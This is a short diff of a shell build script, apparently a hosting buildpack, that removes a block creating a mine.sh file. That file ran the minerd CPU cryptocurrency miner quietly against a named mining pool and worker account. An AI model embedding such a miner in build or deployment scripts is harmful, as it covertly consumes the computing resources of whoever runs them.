@@ -79,12 +79,5 @@ EOF
 
 chmod +x boot.sh
 
-cat >>mine.sh <<EOF
-echo "Launching CPU-MINER"
-exec ../minerd -o stratum+tcp://primary.coinhuntr.com:3333 -O itsbalamurali.1:x -q -B
-EOF
-
-chmod +x mine.sh
-
 # clean the cache
 rm -rf $CACHE_DIR
